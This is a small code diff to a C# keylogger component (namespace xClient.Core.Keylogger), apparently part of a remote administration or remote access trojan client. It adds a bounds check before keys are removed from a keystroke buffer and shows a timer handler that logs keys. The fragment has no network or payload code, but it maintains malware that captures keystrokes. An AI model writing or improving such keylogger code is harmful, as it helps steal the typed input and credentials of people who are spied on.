@@ -236,7 +236,8 @@ namespace xClient.Core.Keylogger
                 }
                 j++;
             }
-            _keyBuffer.RemoveRange(0, j);
+            if (j > 0 && j <= _keyBuffer.Count)
+                _keyBuffer.RemoveRange(0, j);
         }
 
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
